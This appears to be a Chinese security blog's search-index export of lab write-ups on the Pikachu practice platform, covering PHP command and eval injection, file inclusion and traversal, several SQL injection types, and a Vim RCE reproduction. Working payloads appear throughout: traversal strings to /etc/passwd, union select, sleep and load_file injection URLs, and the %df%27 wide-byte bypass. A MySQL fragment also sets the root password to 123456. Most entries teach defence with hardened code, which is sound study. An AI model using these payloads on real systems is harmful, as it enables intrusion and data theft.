123mysql&gt; alter user &apos;root&apos;@&apos;localhost&apos; identified by &apos;yal7YyuBs(OL&apos; -&gt; ;Query OK, 0 rows affected (0.00 sec) 修改密码安全策略查看当前密码安全策略:SHOW VARIABLES LIKE &#39;validate_password%&#39;; 12345678910111213mysql&gt; SHOW VARIABLES LIKE &apos;validate_password%&apos;;+--------------------------------------+--------+| Variable_name | Value |+--------------------------------------+--------+| validate_password_check_user_name | OFF || validate_password_dictionary_file | || validate_password_length | 8 || validate_password_mixed_case_count | 1 || validate_password_number_count | 1 || validate_password_policy | MEDIUM || validate_password_special_char_count | 1 |+--------------------------------------+--------+7 rows in set (0.00 sec) validate_password_dictionary_file #参数是指定密码验证的字典文件路径validate_password_length #表示密码的长度，这个参数由下面的公式生成validate_password_mixed_case_count #表示密码中英文字符大小写的需求个数，当密码策略是MEDIUM或以上时生效。validate_password_number_count #表示密码中数字的需求个数validate_password_policy #这个参数可以设为0、1、2，分别代表从低到高的密码强度，此参数的默认值为1，如果想将密码强度改若，则更改此参数为0。validate_password_special_char_count 表示密码中特殊字符的需求个数 修改密码安全级别与密码长度限制： 1234mysql&gt; set global validate_password_policy=0;Query OK, 0 rows affected (0.00 sec)mysql&gt; set global validate_password_length=0;Query OK, 0 rows affected (0.00 sec) 修改密码为123456： 12mysql&gt; alter user &apos;root&apos;@&apos;localhost&apos; identified by &apos;123456&apos;;Query OK, 0 rows affected (0.00 sec)]]></content>
      <categories>
        <category>LINUX</category>
        <category>系统服务</category>
      </categories>
      <tags>
        <tag>LANMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RCE代码注入与远程命令执行]]></title>
    <url>%2F2019%2F08%2F19%2FRCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.1.101/pika 漏洞概述 PHP代码执行漏洞则是可以把代码注入应用到网站后端代码中，如果漏洞没有特殊过滤，就相当于直接有一个Web后门存在，该漏洞主要由于动态代码执行函数的参数过滤不严谨导致。 在应用需要调用一些外部程序处理内容的情况下，就会用到一些执行系统命令函数，例如system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时将会注入恶意系统命令到正常命令中，造成命令执行功绩 常规eval代码注入eval函数可以把字符串按照php代码来执行，也就是说eval可以动态的执行php代码，代码示例如下：http://192.168.1.101/pika/vul/rce/rce_eval.php 1234567&lt;?phpif(isset($_POST['submit']) &amp;&amp; $_POST['txt'] != null)&#123; if(@！eval($_POST['txt']))&#123; $html.="&lt;p&gt;你喜欢的字符还挺奇怪的!&lt;/p&gt;"; &#125;&#125;?&gt; 当代码被执行时，攻击者可以通过参数值来执行恶意代码，如下图所示，参数利用;分割php语句，执行phpinfo()函数。 远程命令执行一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上 ，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 远程命令执行示例示例代码： 12345678910&lt;?phpif(isset($_POST['submit']) &amp;&amp; $_POST['ipaddress']!=null)&#123; $ip=$_POST['ipaddress']; if(stristr(php_uname('s'), 'windows'))&#123; //判断系统类型 $result.=shell_exec('ping '.$ip);//直接将变量拼接进来，没做处理 &#125;else &#123; $result.=shell_exec('ping -c 4 '.$ip); &#125;&#125;?&gt; 当用户正常使用该命令接口时如下图所示：使用特殊符号拼接命令，使其起到查看当前目录下文件的功能：操作系统中的命令连接符： 123456&amp; &amp;&amp; | ||&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令&amp; 表示命令在后台执行| 将上一条命令的输出内容做为下一条命令的输入参数|| 表示上一条命令执行失败后，才执行下一条命令 代码加固12345678910111213141516171819&lt;?php$result='';if(isset($_POST['submit']) &amp;&amp; $_POST['ipaddress']!=null)&#123; $ip=$_POST['ipaddress']; $check=explode('.', $ip); //以.为分隔符，将IP分为4个字节 //检查每个字节是否都是整数，是否为4个字节 if ((is_numeric($check[0])) &amp;&amp; (is_numeric($check[1])) &amp;&amp; (is_numeric($check[2])) &amp;&amp; (is_numeric($check[3])) &amp;&amp; (sizeof($check) == 4) ) &#123; // 重新拼接4个字节为IP地址 $ip = $check[0].'.'.$check[1].'.'.$check[2].'.'.$check[3]; if(stristr(php_uname('s'), 'windows'))&#123; //判断系统类型 $result.=shell_exec('ping '.$ip);//直接将变量拼接进来，没做处理 &#125;else &#123; $result.=shell_exec('ping -c 4 '.$ip); &#125; &#125;else&#123; print("请输入正确的IP地址"); &#125;&#125;?&gt; 代码加固效果如下图：]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-12735（Vim远程代码执行）漏洞复现]]></title>
    <url>%2F2019%2F08%2F05%2FCVE-2019-12735%EF%BC%88Vim%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[参考博客：https://blog.csdn.net/DarkHQ/article/details/92696160 一、实验环境 KaliLinux 2018 Vim 8.0.1401 二、漏洞影响版本 VIM &lt; 8.1.1365 Neovim &lt; 0.3.6 三、漏洞环境复现由于当前VIM版本没有默认开启modeline，需自己手动添加下，修改home/.vimrc文件，添加一条规则set modeline（如果没有.vimrc文件，自己手动创建一个）脚本是大佬pcy190编写的，链接：https://github.com/pcy190/ace-vim-neovim/一个尝试执行uname的poc，一个利用nc反弹shell的poc 四、漏洞复现侦听本机9999端口在一个新终端上使用VIM编辑poc_shell.txt 五、漏洞防护 更新vim到最新版本 禁用编辑器的 modeline功能，把set modeline 改为set nomodeline 利用vim编辑的时候，查看文件来源是否正规]]></content>
      <categories>
        <category>系统漏洞</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含与目录遍历]]></title>
    <url>%2F2019%2F08%2F04%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%2F</url>
    <content type="text"><![CDATA[实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika漏洞概述 程序开发人员希望代码更加灵活，所以通常会把可重复使用的函数写入到单个文件中，在使用某些函数时，用来进行动态调用，而无需再次编写，这种调用文件的过程被称为包含，但正是因为这种灵活性，导致客户端可以调用一个恶意文件，造成文件包含漏洞。 有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对传入的的文件进行合理的校验或校验被绕过，从而导致攻击者可以通过修改文件的位置来让后台操作其他文件，因此导致意外的文件泄露甚至恶意的代码注入。 File include文件包含漏洞危害： include本地文件包含LFI； 远程系统文件包含RFI（可传入木马）通常为如include函数，可以将web根目录以外的目录包含进来。 形成漏洞根源：include函数对输入变量限制不严，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码 文件包含的函数： 1234require()，找不到被包含的文件时会产生致命错误，并停止脚本运行。include()，找不到被包含的文件时只会产生警告，脚本将继续运行。include_once()与include()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。require_once()与require()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 常见漏洞特征： http://xxx/index.php?page=a.phphttp://xxx/index.php?home=b.htmlhttp://xxx/index.php?file=content 漏洞测试方法：?page=/etc/passwd?page=../../../../../../../../../../../etc/passwd?page=http://192.168.0.13/a.php #类UNIX系统根目录：/目录层级分隔符：/ #windows系统根目录：C:\，D:\，E:\ 等目录层级分隔符：\或/ 示例代码: 1234&lt;?php $filename = $_GET['filename']; include($filename);?&gt; $_GET[&#39;filename&#39;]参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以通过修改$_GET[&#39;filename&#39;]的值，执行非预期的操作。 本地文件包含漏洞 本地文件包含示例代码示例：123456&lt;?phpif(isset($_GET['submit']) &amp;&amp; $_GET['filename']!=null)&#123; $filename=$_GET['filename']; include "include/$filename";//变量传进来直接包含,没做任何的安全限制&#125;?&gt; 正常访问网页，提交查询kobe访问的网页URL为:http://192.168.31.193/pika/vul/fileinclude/fi_local.php?filename=file1.php&amp;submit=提交查询当提交参数filename值修改为../../../../../../../../../../flag.txt时，则页面内容改编为flag.txt文件内容 远程文件包含漏洞PHP的配置文件(/etc/php5/cgi/php.ini )中的allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。 远程文件包含示例代码示例：123456&lt;?phpif(isset($_GET['submit']) &amp;&amp; $_GET['filename']!=null)&#123; $filename=$_GET['filename']; include "include/$filename";//变量传进来直接包含,没做任何的安全限制&#125;?&gt; 建立站点用来远程文件包含漏洞中被包含，URL:http://192.168.31.193/7/cmd.txt通过远程文件包含漏洞，包含http://192.168.31.193/7/cmd.txt在webshell中执行系统命令，查看当前用户 Directory Traversal 目录遍历漏洞危害：本台机器操作系统上文件进行读取使用者可以通过浏览器/URL地址或者参数变量内容，可以读取web根目录【默认为:/var/www/】之外的其他操作系统文件(如：/etc/passwd/)。形成漏洞根源：目录权限限制不严格 目录遍历漏洞示例示例代码： 123456&lt;?phpif(isset($_GET['title']))&#123; $filename=$_GET['title']; //这里直接把传进来的内容进行了require(),造成问题 require "soup/$filename";?&gt; URL:http://192.168.31.193/pika/vul/dir/dir_list.php?title=jarheads.php 修改url中title参数的值为../../../../../../../../../../flag.txt]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>文件目录安全</category>
      </categories>
      <tags>
        <tag>文件目录安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL盲注进阶——BurpSuite]]></title>
    <url>%2F2019%2F08%2F01%2FSQL%E7%9B%B2%E6%B3%A8%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6%2F</url>
    <content type="text"><![CDATA[一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika 二、Burpsuite——Intruder模块简介Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。你可以使用 Burp Intruder 方便地执行许多任务，包括枚举标识符，获取有用数据，漏洞模糊测试。合适的攻击类型取决于应用程序的情况，可能包括：缺陷测试：SQL 注入，跨站点脚本，缓冲区溢出，路径遍历；暴力攻击认证系统；枚举；操纵参数；拖出隐藏的内容和功能；会话令牌测序和会话劫持；数据挖掘；并发攻击；应用层的拒绝服务式攻击。 三、Intruder模块说明Burp Intruder主要有四个模块组成:1：Target 用于配置目标服务器进行攻击的详细信息。2：Positions 设置Payloads的插入点以及攻击类型（攻击模式）。3：Payloads 设置payload，配置字典4：Opetions 此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。 四、搭配Intruder自动爆破数据库 将截断的数据包发送至Intruder 设置Pyloads的插入点 设置Pyload，导入字典 启动自动攻击观察攻击运行至什么pyload时，会停留延时]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL盲注注入]]></title>
    <url>%2F2019%2F07%2F30%2FSQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8%2F</url>
    <content type="text"><![CDATA[一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika 二、漏洞概述盲注是指数据库查询结果无法从直观页面中获取，攻击者通过使用数据库逻辑或数据库执行延时等方法获取想要的信息。在一下几种情况中可能需要用到盲注手段： 部分网站没有输出显示，只能通过延时判断 不管正确或者错误的输入，都只显示两种情况 部分网站没办法 union select 联合查询方式注入 布尔盲注布尔盲注利用MySQL条件不成立时返回空内容，条件成立时返回正常数据的特点来进行攻击。比如MySQL中有一个substr函数，他可以截取M有SQL内部返回值与某一字符进行比较，通过遍历比较就可以还原出攻击者想得到的结果。 时间盲注同理，时间盲注通过substr截取字段返回信息的字符，通过一个个字符推算出最终的数据。和布尔盲注不同的是，时间盲注不是依据页面是否返回空内容来判断是否成立而是根据响应时间来判断。如果条件成立，页面就会比平时的响应速度更慢。 三、SQL语句原理 检测延时注入 12345678mysql&gt; select id,username from member where id=&apos;1&apos;union select 1,sleep(10);+----+----------+ | id | username |+----+----------+| 1 | vince || 1 | 0 |+----+----------+2 rows in set (10.00 sec) 猜测数据库长度 1234567891011121314151617181920212223242526mysql&gt; select database() -&gt; ;+------------+| database() |+------------+| pikachu |+------------+1 row in set (0.00 sec)mysql&gt; select id,username from member where id=&apos;1&apos;union select 2,sleep(if((length(database())=7),10,0));+----+----------+| id | username |+----+----------+| 1 | vince || 2 | 0 |+----+----------+2 rows in set (10.00 sec)mysql&gt; select id,username from member where id=&apos;1&apos;union select 2,sleep(if((length(database())=6),10,0));+----+----------+| id | username |+----+----------+| 1 | vince || 2 | 0 |+----+----------+2 rows in set (0.00 sec) if(条件,a,b)//若条件为TRUE则返回a,若条件为FALSE则返回b length(database()); //返回当前数据库名的长度 猜测数据库名称 123456789101112131415mysql&gt; select ascii(substr(database(),1,1));+-------------------------------+| ascii(substr(database(),1,1)) |+-------------------------------+| 112 |+-------------------------------+1 row in set (0.00 sec)mysql&gt; select id,username from member where id=&apos;i&apos; union select 1,if((ascii(substr(database(),1,1))=112),sleep(10),NULL);+----+----------+| id | username |+----+----------+| 1 | 0 |+----+----------+1 row in set (10.00 sec) substr(string,start,length) string:必选，被截取的字段 start:当该参数为正数时从字符串指定位置开始截取 当该参数为负数时从字符串结尾指定位置开始截取 length:需要截取的长度，缺省，即截取到结束位置。 ascii(str) 返回字符串最左边的字符的ascii码 四、布尔盲注实例 观察网页正常回显 在name=kobe后面加上一个“ &#39; ”，然后观察页面回显 出现这种情况就可能存在注入点，为确保准确性，猜测该位置的SQL查询语句就是用“ &#39; ”，进行闭合。修改URL为http://192.168.31.193/pika/vul/sqli/sqli_blind_b.php?name=kobe%27+--+&amp;submit=查询# 成功返回正常的页面，现在可以100%确定该网页存在注入漏洞，下面就可以进一步进行渗透 五、时间盲注检测 观察网页页面回显，发现无论提交什么参数都是相同的回显 构造延时查询的SQL语句进行注入 通过图5-7，可以说明该网站在返回请求时延时了10秒 猜测数据库名称长度在判断数据库名称为7时延时了10秒，证明当前数据库名称长度为7 猜测数据库名称中第一位字符体现在网页中就是当你猜中了数据库名的第1位，网页加载时间变长为10s；ascii 112=p]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL宽字节注入]]></title>
    <url>%2F2019%2F07%2F28%2FSQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika 二、漏洞概述在实际环境中，程序员很少会写一点防护都没有的代码，宽字节注入源于程序员设置MySQL连接时错误配置为“set character_set_client=gbk”，这样配置会引发编码转换从而导致注入漏洞， 正常情况下，当GPC开启或使用addslashes函数过滤GET或POST提交的参数时，攻击者使用的“&#39;”就会被转义为“\‘”。 但如果存在宽字节注入%df%27时，首先经过单引号转义成%df%5c%27（%5c是反斜杠\，%27是单引号’），之后在数据库查询前使用了GBK多字节编码，即在汉字编码范围内两个字节会被编码为有个汉字。 然后MySQL服务器会对查询语句进行GBK编码，即%df%5c转换成汉字“運”，而单引号逃逸了出来从而照成注入漏洞。 三、实验准备在我们使用的PIKACHU漏洞练习平台中，宽字节注入实验默认关闭了MySQL的错误描述显示，为方便学习理解，需要开启MySQL的错误描述：修改\pika\vul\sqli\sqli_widebyte.php文件,将$result=mysqli_query($link, $query);修改为$result=execute($link, $query); 四、实验演示 检测注入点使用Burp截断转发功能修改报文将修改完毕后的报文发送给WEB服务器，观察网页回显 12341%df&apos;==1運 &apos;=\&apos; \==%5c %df%5c%27==運&apos; 猜测该网页SQL的查询语句为：select id,email from *** where ***=&#39;$name&#39; 构造SQL注入语句构造查看数据库与用户的SQL语句注入结果 五、理解代码原理与代码加固 代码理解与分析 123456789101112131415161718192021222324252627&lt;?php$link=connect();$html='';if(isset($_POST['submit']) &amp;&amp; $_POST['name']!=null)&#123; //escape在这的功能类似$name = addslashes($name) $name = escape($link,$_POST['name']); $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合 //设置mysql客户端来源编码是gbk,这个设置导致出现宽字节注入问题 $set = "set character_set_client=gbk"; execute($link,$set); //mysqi_query不打印错误描述 //$result=mysqli_query($link, $query); $result=execute($link, $query); if(mysqli_num_rows($result) &gt;= 1)&#123; while ($data=mysqli_fetch_assoc($result))&#123; $id=$data['id']; $email=$data['email']; $html.="&lt;p class='notice'&gt;your uid:&#123;$id&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;"; &#125; &#125;else&#123; $html.="&lt;p class='notice'&gt;您输入的username不存在，请重新输入！&lt;/p&gt;"; &#125;&#125;?&gt; set character_set_client=gbk 是导致该漏洞的主要原因，其他代码会导致该漏洞，具体如下： 123set character_set_connection=gbk;set character_set_results=gbk;mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;); 代码加固与防护为了防止宽字节编码出现的参数问题，现在开发者基本上都会选择将MySQL连接配置为set character_set_client=binary来避免宽字节编码的问题发生。 12345678910111213141516171819202122232425262728&lt;?php$link=connect();$html='';if(isset($_POST['submit']) &amp;&amp; $_POST['name']!=null)&#123; $name = escape($link,$_POST['name']); $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合 //将MySQL连接配置为binary $set = "set character_set_client=binary"; execute($link,$set); //mysqi_query不打印错误描述 //$result=mysqli_query($link, $query); $result=execute($link, $query); if(mysqli_num_rows($result) &gt;= 1)&#123; while ($data=mysqli_fetch_assoc($result))&#123; $id=$data['id']; $email=$data['email']; $html.="&lt;p class='notice'&gt;your uid:&#123;$id&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;"; &#125; &#125;else&#123; $html.="&lt;p class='notice'&gt;您输入的username不存在，请重新输入！&lt;/p&gt;"; &#125;&#125;?&gt; 测试防护效果]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pikachu环境搭建]]></title>
    <url>%2F2019%2F07%2F28%2Fpikachu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[一、需求环境 Win7 64位 phpstudy 2018 pikachu-master(pikachu漏洞练习平台) 二、安装步骤 在Win7系统中安装phpStudy(官方版为一键解压包)启动phpstudy（Mysql默认用户：root，默认密码：root） 搭建pikachu漏洞练习平台将pikachu-master解压至C:\phpStudy\PHPTutorial\WWW（用于存放网页文件的目录）初始化pikachu平台访问http://127.0.0.1/pikachu-master/install.php 搭建完成，可以开始实验]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL数字型注入 （POST）]]></title>
    <url>%2F2019%2F07%2F28%2FSQL%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-POST%2F</url>
    <content type="text"><![CDATA[一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar与FoxyProxy） BurpSuite_Pro v1.7.26 破解版 漏洞平台地址为：http://192.168.31.193/pika 二、实验步骤 观察注入点尝试在表单的下拉菜单中提交任意数据，观察URL与网页URL：http://192.168.31.193/pika/vul/sqli/sqli_id.php ，如图2-1所示：可以看到页面回显正常，但URL部分没有传值参数，判断该网页请求方式为POST 检测注入点该网页请求方式为POST所以我们需要用到Hackbar或者BurpSuite，这里使用Burp设置好代理后重新提交参数，并用Burp截断HTTP的报文，如图2-2所示：将该报文发送至Repeater即可开始进行注入测试，如图2-3所示：尝试在id=1参数修改为id=1 or 1=1,然后发送报文，查看Response，如图2-4所示：可以看到我们拼接的逻辑运算语句正常运行，并把数据表中的所有数据都显示出来 查询显示的字段数尝试使用order by语句判断该网页表单能够显示的字段数，如图2-5所示： 获取当前数据库及运行数据库的用户名使用union select拼接SQL语句查看用户及数据库，如图2-6所示： 三、代码理解与防范 源代码(pika\vul\sqli\sqli_id.php) 123456789101112131415161718192021&lt;?php$link=connect();$html='';if(isset($_POST['submit']) &amp;&amp; $_POST['id']!=null)&#123; //这里没有做任何处理，直接拼到select里面去了,形成Sql注入 $id=$_POST['id']; $query="select username,email from member where id=$id"; $result=execute($link, $query); //这里如果用==1,会严格一点 if(mysqli_num_rows($result)&gt;=1)&#123; while($data=mysqli_fetch_assoc($result))&#123; $username=$data['username']; $email=$data['email']; $html.="&lt;p class='notice'&gt;hello,&#123;$username&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;"; &#125; &#125;else&#123; $html.="&lt;p class='notice'&gt;您输入的user id不存在，请重新输入！&lt;/p&gt;"; &#125;&#125;?&gt; 通过判断参数类型对网页起到防护作用 1234567891011121314151617181920&lt;?php$link=connect();$html='';//&amp;&amp; id_numeric($_POST['id'])判断从网页传入的值是否为数字，如果带有其他字符将不运行后面的代码if(isset($_POST['submit']) &amp;&amp; $_POST['id']!=null &amp;&amp; id_numeric($_POST['id']))&#123; $id=$_POST['id']; //数字型注入与字符型注入不同的地方是因为id=$id并没有使用符号进行闭合 $query="select username,email from member where id=$id"; $result=execute($link, $query); if(mysqli_num_rows($result)&gt;=1)&#123; while($data=mysqli_fetch_assoc($result))&#123; $username=$data['username']; $email=$data['email']; $html.="&lt;p class='notice'&gt;hello,&#123;$username&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;"; &#125; &#125;else&#123; $html.="&lt;p class='notice'&gt;您输入的user id不存在，请重新输入！&lt;/p&gt;"; &#125;&#125;?&gt;]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL字符型注入 （GET）]]></title>
    <url>%2F2019%2F07%2F27%2FSQL%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5-GET%2F</url>
    <content type="text"><![CDATA[一、实验环境 Pikachu漏洞联系平台 （Windows+Phpstudy环境） 火狐浏览器（附带插件HackBar） 漏洞平台地址为：http://192.168.31.193/pika 二、SQL注入原理数据库注入漏洞，主要是开发人员在构建代码时，没有对输入边界进行安全考虑，导致攻击可以通过合法的输入点提交一些精心构造的语句，从而欺骗后台数据库进行执行，导致数据库信息泄露的一种漏洞。 三、实验步骤 观察注入点尝试在表单中提交数据 kobe 观察URL：http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=kobe&amp;submit=查询， 与网页中的表单，如图1-1所示： 检测注入点尝试在name=kobe参数后面加上 ‘ (URL编码为：%27）然后观察页面变化，URL:http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=kobe&#39;submit=查询可以看到加上之后页面内容报错，出现这种现象大多数情况下时存在注入点，如图1-2所示: 查询显示的字段数尝试使用order by语句判断该网页表单能够显示的字段数，URL:http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=1%27order+by+3+--+&amp;submit=查询， 出现“Unknown column ‘3’ in ‘order clause’” ，3表示已经超出表单的显示数量，所以该表单的字段的显示数量为2个字段，如图1-3所示： 获取当前数据库及运行数据库的用户名使用联合查询语句union select 获取当前的数据库及运行Mysql服务的用户URL:http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=1%27union+select+database(),user()+--+&amp;submit=查询 ，效果如图1-4所示： 通过SQL注入漏洞读取WEB服务器本地的文件内容使用load_file()语句读取本地C盘中的flag.txt文件内容URL：http://192.168.31.193/pika/vul/sqli/sqli_str.php?name=1%27%20union%20select%20null,load_file(%22C:\\flag.txt%22)+--+&amp;submit=查询 ，效果如图1-5所示：flag.txt文件内容： 四、代码理解与防范 源代码(pika\vul\sqli\sqli_str.php) 123456789101112131415161718192021&lt;?php$link=connect();$html='';if(isset($_GET['submit']) &amp;&amp; $_GET['name']!=null)&#123; //这里没有做任何处理，直接拼到select里面去了 $name=$_GET['name']; //这里的变量是字符型，需要考虑闭合 $query="select id,email from member where username='$name'"; $result=execute($link, $query) ; if(mysqli_num_rows($result)&gt;=1)&#123; while($data=mysqli_fetch_assoc($result))&#123; $id=$data['id']; $email=$data['email']; $html.="&lt;p class='notice'&gt;your uid:&#123;$id&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;"; &#125; &#125;else&#123; $html.="&lt;p class='notice'&gt;您输入的username不存在，请重新输入！&lt;/p&gt;"; &#125;&#125;?&gt; 通过函数转义的方式对源代码进行加固 1234567891011121314151617181920212223&lt;?php$link=connect();$html='';if(isset($_GET['submit']) &amp;&amp; $_GET['name']!=null)&#123; //这里没有做任何处理，直接拼到select里面去了 $name=$_GET['name']; //addslashes()若$name所传入的字符串中带有特殊字符，则该函数会在特殊符号前添加“/”，表示将其转义 //$name = addslashes($name); //这里的变量是字符型，需要考虑闭合 $query="select id,email from member where username='$name'"; $result=execute($link, $query) ; if(mysqli_num_rows($result)&gt;=1)&#123; while($data=mysqli_fetch_assoc($result))&#123; $id=$data['id']; $email=$data['email']; $html.="&lt;p class='notice'&gt;your uid:&#123;$id&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;"; &#125; &#125;else&#123; $html.="&lt;p class='notice'&gt;您输入的username不存在，请重新输入！&lt;/p&gt;"; &#125;&#125;?&gt; 测试防护效果]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
</search>
